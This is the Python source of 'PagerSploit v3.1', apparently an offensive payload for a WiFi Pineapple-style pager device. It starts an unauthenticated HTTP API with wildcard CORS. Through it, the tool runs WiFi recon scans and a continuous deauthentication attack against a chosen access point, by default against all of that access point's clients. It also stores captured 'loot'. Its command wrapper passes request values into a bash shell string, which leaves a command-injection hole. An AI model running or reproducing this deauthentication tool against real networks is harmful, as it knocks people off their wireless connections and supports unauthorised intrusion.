#!/usr/bin/env python3
"""
PagerSploit v3.1 - Hybrid Stable Edition
Based on GitHub skeleton // Improved Attacks
"""

import os, sys, json, re, time, threading, subprocess, argparse
import socket, base64, urllib.request, urllib.parse, shutil
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import parse_qs, urlparse, unquote_plus

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pagerctl import Pager

STATE = {
    'active_module': 'idle', 'module_status': 'Standing by',
    'loot_count': 0, 'server_ip': '172.16.52.1', 'server_port': '8080',
    'payload_dir': '', 'log': [], 'scan_results': [], 'hosts': [],
    'jobs': {}, 'stop_events': {}, 'module_data': {},
}
STATE_LOCK = threading.Lock()

RECON_DB = '/etc/pineapple/recon.db'
PINEAP_FUNCTIONS = '/etc/pineapple/functions'

def log(msg, level='info'):
    entry = {'time': datetime.now().strftime('%H:%M:%S'), 'level': level, 'msg': str(msg)}
    with STATE_LOCK:
        STATE['log'].append(entry)
        if len(STATE['log']) > 100: STATE['log'] = STATE['log'][-100:]
    print(f"[{entry['time']}] {msg}", flush=True)

def set_module(name, status='Running'):
    with STATE_LOCK:
        STATE['active_module'] = name
        STATE['module_status'] = status

def start_job(name, fn, *args, **kwargs):
    t = threading.Thread(target=fn, args=args, kwargs=kwargs, daemon=True)
    t.start()
    with STATE_LOCK: STATE['jobs'][name] = t
    return t

def make_stop(): return threading.Event()

def reg_stop(name, ev):
    with STATE_LOCK: STATE['stop_events'][name] = ev

def unreg_stop(name):
    with STATE_LOCK: STATE['stop_events'].pop(name, None); STATE['jobs'].pop(name, None)

def loot_path(*parts): return os.path.join(STATE['payload_dir'], 'loot', *parts)

def save_loot(subdir, filename, content):
    path = loot_path(subdir, filename)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb' if isinstance(content, bytes) else 'w') as f: f.write(content)
    with STATE_LOCK: STATE['loot_count'] += 1
    return path

# ── Optimized PineAP Wrapper ──────────────────────────────────────────────

def _pineapple(*args):
    """Stable wrapper for Pineapple commands."""
    cmd_str = ' '.join(f'"{a}"' for a in args)
    full_cmd = f'source {PINEAP_FUNCTIONS} && {cmd_str}'
    try:
        r = subprocess.run(['bash', '-c', full_cmd], capture_output=True, text=True, timeout=10)
        return r.stdout.strip()
    except: return ''

# ── WiFi Attacks (Fixed with Radio Locking) ───────────────────────────────

def wifi_scan(band='abg', duration=10):
    """Instant Scan via Recon DB."""
    log(f'WiFi scan ({band})...'); set_module('WiFi Scan', 'Querying DB...')
    _pineapple('PINEAPPLE_RECON_START')
    time.sleep(2) # Brief wait for DB sync
    
    results = []
    # We use a subshell to query sqlite to avoid importing the heavy sqlite3 library in the main process if not needed
    try:
        cmd = f"sqlite3 -json {RECON_DB} 'SELECT ssid, mac, channel, signal, encryption FROM wifi_ap_view ORDER BY signal DESC LIMIT 50'"
        out = subprocess.check_output(['bash', '-c', cmd], text=True)
        if out:
            raw_aps = json.loads(out)
            for ap in raw_aps:
                results.append({
                    'ssid': ap['ssid'] or '<hidden>',
                    'bssid': ap['mac'].upper(),
                    'channel': int(ap['channel']),
                    'signal': int(ap['signal']),
                    'encryption': str(ap['encryption'])
                })
    except Exception as e: log(f'Scan error: {e}', 'error')
    
    with STATE_LOCK: STATE['scan_results'] = results
    set_module('idle', f'{len(results)} APs found'); return results

def wifi_deauth(bssid, channel='6', client='FF:FF:FF:FF:FF:FF'):
    """Deauth with Radio Locking (Stable)."""
    stop = make_stop(); reg_stop('deauth', stop)
    def _run():
        log(f'Deauth: {bssid} ch{channel}', 'warn'); set_module('Deauth', bssid)
        # Lock Radio
        _pineapple('PINEAPPLE_HOPPING_STOP')
        _pineapple('PINEAPPLE_EXAMINE_BSSID', bssid)
        try:
            while not stop.is_set():
                _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, client, channel)
                stop.wait(2)
        finally:
            _pineapple('PINEAPPLE_EXAMINE_RESET')
            _pineapple('PINEAPPLE_HOPPING_START')
        unreg_stop('deauth'); set_module('idle', 'Deauth done')
    start_job('deauth', _run)

# ── API Handler (GitHub Compatible) ───────────────────────────────────────

class APIHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def send_json(self, data):
        body = json.dumps(data).encode(); self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*'); self.end_headers()
        self.wfile.write(body)
    
    def do_GET(self):
        p = urlparse(self.path).path
        if p == '/api/state':
            with STATE_LOCK: s = {k: v for k, v in STATE.items() if k != 'module_data'}
            self.send_json(s)
        elif p == '/api/log':
            with STATE_LOCK: self.send_json(STATE['log'])
        elif p == '/api/scans':
            with STATE_LOCK: self.send_json(STATE['scan_results'])
        elif p in ('/', '/index.html'):
            with open(os.path.join(STATE['payload_dir'], 'pagersploit_ui.html'), 'rb') as f:
                self.send_response(200); self.end_headers(); self.wfile.write(f.read())
        elif p == '/pagersploit.js':
            with open(os.path.join(STATE['payload_dir'], 'pagersploit.js'), 'rb') as f:
                self.send_response(200); self.send_header('Content-Type', 'application/javascript'); self.end_headers(); self.wfile.write(f.read())

    def do_POST(self):
        p = urlparse(self.path).path; length = int(self.headers.get('Content-Length', 0))
        b = json.loads(self.rfile.read(length).decode('utf-8', errors='ignore')) if length else {}
        
        if p == '/api/wifi/scan': start_job('wifi_scan', wifi_scan, b.get('band', 'abg'))
        elif p == '/api/wifi/deauth': wifi_deauth(b.get('bssid'), str(b.get('channel', '6')))
        elif p == '/api/stop_all':
            with STATE_LOCK:
                for ev in STATE['stop_events'].values(): ev.set()
            self.send_json({'status': 'stopped'}); return
        self.send_json({'status': 'started'})

# ── Pager Display Loop (GitHub Compatible) ────────────────────────────────

def rgb(r, g, b): return ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3)
C_BG, C_TITLE, C_GREEN = rgb(4, 4, 12), rgb(0, 255, 180), rgb(0, 255, 80)

def pager_display_loop(p, stop_event):
    p.set_rotation(270); BTN_B = Pager.BTN_B
    while not stop_event.is_set():
        try:
            with STATE_LOCK: mod, sts, loot, ip = STATE['active_module'], STATE['module_status'], STATE['loot_count'], STATE['server_ip']
            p.fill_rect(0, 0, 480, 222, C_BG); p.fill_rect(0, 0, 480, 18, rgb(0, 30, 20))
            p.draw_text(4, 2, 'PAGERSPLOIT v3.1 (STABLE)', C_TITLE, 1)
            p.draw_text(10, 40, f"IP: {ip}", C_GREEN, 2); p.draw_text(10, 80, f"MOD: {mod}", rgb(255, 220, 0), 2)
            p.draw_text(10, 110, f"STS: {sts[:30]}", rgb(200, 200, 200), 1)
            p.flip()
            _, pressed, _ = p.poll_input()
            if pressed & BTN_B: stop_event.set()
        except: pass
        time.sleep(0.3)

# ── Main Boot Sequence (GitHub Compatible) ────────────────────────────────

def run():
    parser = argparse.ArgumentParser()
    parser.add_argument('--payload-dir', required=True)
    args = parser.parse_args()
    with STATE_LOCK: STATE['payload_dir'] = args.payload_dir
    
    # 1. Initialize Server Exactly Like Your GitHub Version
    server = ThreadedHTTPServer(('0.0.0.0', 8080), APIHandler)
    server.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    
    log(f'PagerSploit Stable v3.1 Started', 'success')
    
    # 2. Main Hardware Thread
    stop_event = threading.Event()
    with Pager() as p:
        pager_display_loop(p, stop_event)
    
    server.shutdown()

if __name__ == '__main__':
    run()
